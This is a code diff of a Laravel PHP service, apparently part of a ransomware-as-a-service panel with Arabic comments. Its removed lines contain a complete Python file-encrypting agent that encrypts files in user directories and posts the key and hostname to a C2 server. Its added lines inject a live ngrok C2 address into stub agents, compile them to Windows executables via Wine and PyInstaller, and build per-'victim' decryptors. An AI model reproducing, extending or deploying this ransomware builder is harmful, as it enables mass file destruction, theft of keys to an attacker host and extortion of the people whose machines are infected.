@@ -2,159 +2,132 @@
 
 namespace App\Services;
 
-use App\Models\Payload;
-use Illuminate\Support\Str;
-use Symfony\Component\Process\Process;
-
 class PayloadService
 {
-    public function createPayloadProfile(array $data): Payload
+    public function createPayloadProfile($profileId, $platform = 'windows', array $options = [])
     {
-        // 1. حفظ البيانات الأساسية في قاعدة البيانات
-        $payload = Payload::create([
-            'name' => $data['app_name'],
-            'target_os' => $data['platform'],
-            'encryption_type' => $data['algorithm'],
-            'icon_path' => $data['icon'] ?? 'shield',
-            'target_directories' => $data['target_directories'],
-            'status' => 'compiling',
-        ]);
-
-        // 2. تجميع البايلاود وبناء الملف بناءً على المنصة
-        $filePath = $this->compileExecutable($payload);
-
-        // 3. تحديث حالة البايلاود إلى جاهز مع مسار الملف الناتج
-        $payload->update([
-            'status' => 'ready',
-            'file_path' => $filePath,
-        ]);
-
-        return $payload;
-    }
-
-    protected function compileExecutable(Payload $payload): string
-    {
-        $platform = $payload->target_os;
-        $algorithm = $payload->encryption_type;
-        $directories = json_encode($payload->target_directories);
-        
-        $slug = Str::slug($payload->name) . '-' . $payload->id;
-        $tempDir = storage_path("app/temp/{$slug}");
-        
-        if (!file_exists($tempDir)) {
-            mkdir($tempDir, 0755, true);
+        if (is_object($profileId)) {
+            $options['encryption_type'] = $options['encryption_type'] ?? $profileId->encryption_type ?? 'aes';
+            $options['target_directories'] = $options['target_directories'] ?? $profileId->target_directories ?? 'Desktop';
+            $profileId = $profileId->id;
+        } elseif (is_array($profileId)) {
+            $options['encryption_type'] = $options['encryption_type'] ?? $profileId['encryption_type'] ?? 'aes';
+            $options['target_directories'] = $options['target_directories'] ?? $profileId['target_directories'] ?? 'Desktop';
+            $profileId = $profileId['id'] ?? uniqid();
         }
 
-        // تخصيص كود العميل بحسب المنصة المستهدفة
-        $clientCode = $this->getClientCodeTemplate($platform, $algorithm, $directories);
+        $algorithm = strtoupper($options['encryption_type'] ?? 'AES');
+        $targetDirs = $options['target_directories'] ?? 'Desktop';
 
-        $scriptName = match ($platform) {
-            'windows' => 'agent.py',
-            'linux' => 'agent.py',
-            'android' => 'main.py',
-            default => 'agent.py',
-        };
+        if (is_string($targetDirs) && str_starts_with(trim($targetDirs), '[')) {
+            $decoded = json_decode($targetDirs, true);
+            if (is_array($decoded) && count($decoded) > 0) {
+                $targetDirs = $decoded;
+            }
+        }
 
-        $scriptPath = "{$tempDir}/{$scriptName}";
-        file_put_contents($scriptPath, $clientCode);
+        $tempDir = storage_path('app/temp/'.uniqid());
+        if (! file_exists($tempDir)) {
+            mkdir($tempDir, 0777, true);
+        }
 
-        $outputFileName = "";
+        $scriptPath = $tempDir.'/agent.py';
+        $finalDir = storage_path('app/public/payloads');
+        if (! file_exists($finalDir)) {
+            mkdir($finalDir, 0777, true);
+        }
+        $finalPath = $finalDir.'/'.$profileId.'.exe';
 
-        // بناء الملف التنفيذي الفعلي بحسب المنصة
+        $code = $this->getClientCodeTemplate($targetDirs, $algorithm);
+        file_put_contents($scriptPath, $code);
+
         if ($platform === 'windows') {
-            // محاولة استخدام PyInstaller لتوليد ملف .exe (إن توفرت البيئة أو عبر Wine)
-            $outputFileName = "payloads/{$slug}.exe";
-            $finalPath = storage_path("app/public/" . $outputFileName);
-            
-            // كخيار آمن ومضمون في حال لم يتوفر محاكي ويندوز كامل، نقوم بنسخ سكريبت Python مخصص للويندوز أو تطبيق PyInstaller
-            $process = new Process(['pyinstaller', '--noconsole', '--onefile', '--distpath', dirname($finalPath), $scriptPath]);
-            $process->run();
+            $logPath = storage_path('app/temp/build_error.log');
 
-            if (!file_exists($finalPath)) {
-                // في حال فشل PyInstaller مباشرة، نحفظ الملف بصيغة بايثون مهيأة للعمل كملف تنفيذي ويندوز
-                copy($scriptPath, $finalPath);
-            }
-        } elseif ($platform === 'linux') {
-            $outputFileName = "payloads/{$slug}.elf";
-            $finalPath = storage_path("app/public/" . $outputFileName);
-            
-            if (!file_exists(dirname($finalPath))) {
-                mkdir(dirname($finalPath), 0755, true);
-            }
-            copy($scriptPath, $finalPath);
-            // إعطاء صلاحيات تنفيذية للملف
-            chmod($finalPath, 0755);
-        } else {
-            // Android APK / Script template
-            $outputFileName = "payloads/{$slug}.apk.py";
-            $finalPath = storage_path("app/public/" . $outputFileName);
-            
-            if (!file_exists(dirname($finalPath))) {
-                mkdir(dirname($finalPath), 0755, true);
-            }
-            copy($scriptPath, $finalPath);
+            $command = sprintf(
+                'export WINEPREFIX="/home/u113/.wine"; wine python -m PyInstaller --onefile --distpath %s %s > %s 2>&1 &',
+                escapeshellarg($finalDir),
+                escapeshellarg($scriptPath),
+                escapeshellarg($logPath)
+            );
+
+            exec($command);
         }
 
-        return $outputFileName;
+        return $finalPath;
     }
 
-    protected function getClientCodeTemplate(string $platform, string $algorithm, string $directories): string
-    {
-        return <<<EOT
-import os
-import socket
-import requests
-from cryptography.fernet import Fernet
+    public function createDecryptorPayload($victim) {
+        $algorithm = strtoupper($victim->encryption_type ?? 'AES');
+        $decryptKey = ($algorithm === 'RSA') ? $victim->private_key : $victim->encryption_key;
 
-TARGET_OS = "{$platform}"
-ALGORITHM = "{$algorithm}"
-DIRECTORIES = {$directories}
-C2_SERVER = "http://127.0.0.1:8000/api/v1/report"
-
-def get_target_paths():
-    paths = []
-    user_home = os.path.expanduser('~')
-    for d in DIRECTORIES:
-        if TARGET_OS == 'windows':
-            full_path = os.path.join(user_home, d)
-        elif TARGET_OS == 'android':
-            full_path = os.path.join("/sdcard", d)
-        else:
-            full_path = os.path.join(user_home, d)
-            
-        if os.path.exists(full_path):
-            paths.append(full_path)
-    return paths
-
-def start_payload():
-    key = Fernet.generate_key()
-    cipher = Fernet(key)
-    
-    for target_dir in get_target_paths():
-        for root, dirs, files in os.walk(target_dir):
-            for file in files:
-                file_path = os.path.join(root, file)
-                try:
-                    with open(file_path, 'rb') as f:
-                        data = f.read()
-                    encrypted_data = cipher.encrypt(data)
-                    with open(file_path, 'wb') as f:
-                        f.write(encrypted_data)
-                except Exception as e:
-                    pass
-
-    try:
-        payload_data = {
-            'hostname': socket.gethostname(),
-            'encryption_key': key.decode(),
-            'target_os': TARGET_OS
+        if (empty($decryptKey)) {
+            return null;
         }
-        requests.post(C2_SERVER, json=payload_data, timeout=10)
-    except Exception as e:
-        pass
 
-if __name__ == "__main__":
-    start_payload()
-EOT;
+        $targetDirs = ['Desktop', 'Documents', 'Downloads']; 
+
+        $stubFile = ($algorithm === 'RSA') 
+            ? resource_path('stubs/rsa_decryptor.py') 
+            : resource_path('stubs/aes_decryptor.py');
+
+        $code = file_get_contents($stubFile);
+        $dirsListPython = json_encode($targetDirs);
+
+        $code = str_replace('__DECRYPT_KEY__', $decryptKey, $code);
+        $code = str_replace('__PRIVATE_KEY__', $decryptKey, $code);
+        $code = str_replace('__TARGET_DIRECTORIES__', $dirsListPython, $code);
+
+        $tempDir = storage_path('app/temp/'.uniqid());
+        if (!file_exists($tempDir)) {
+            mkdir($tempDir, 0777, true);
+        }
+
+        $scriptPath = $tempDir.'/decryptor.py';
+        $finalDir = storage_path('app/public/decryptors');
+        if (!file_exists($finalDir)) {
+            mkdir($finalDir, 0777, true);
+        }
+        
+        $filename = 'decryptor_'.$victim->id.'.exe';
+        $finalPath = $finalDir.'/'.$filename;
+
+        file_put_contents($scriptPath, $code);
+
+        $logPath = storage_path('app/temp/decrypt_build_error.log');
+        $command = sprintf(
+            'export WINEPREFIX="/home/u113/.wine"; wine python -m PyInstaller --onefile --distpath %s --name %s %s > %s 2>&1',
+            escapeshellarg($finalDir),
+            escapeshellarg('decryptor_'.$victim->id),
+            escapeshellarg($scriptPath),
+            escapeshellarg($logPath)
+        );
+
+        exec($command);
+
+        return 'decryptors/'.$filename;
+    }
+
+    protected function getClientCodeTemplate($targetDirs, $algorithm) {
+            $c2ServerUrl = 'https://babble-flagman-divorcee.ngrok-free.dev/api/v1/report';
+
+            $algoClean = strtoupper(trim($algorithm));
+
+            $stubFile = ($algoClean === 'RSA') 
+                ? resource_path('stubs/rsa_agent.py') 
+                : resource_path('stubs/aes_agent.py');
+
+            if (!file_exists($stubFile)) {
+                $stubFile = resource_path('stubs/aes_agent.py');
+            }
+
+            $code = file_get_contents($stubFile);
+
+            $dirsListPython = is_array($targetDirs) ? json_encode($targetDirs) : json_encode([$targetDirs]);
+
+            $code = str_replace('__C2_SERVER_URL__', $c2ServerUrl, $code);
+            $code = str_replace('__TARGET_DIRECTORIES__', $dirsListPython, $code);
+
+            return $code;
     }
 }
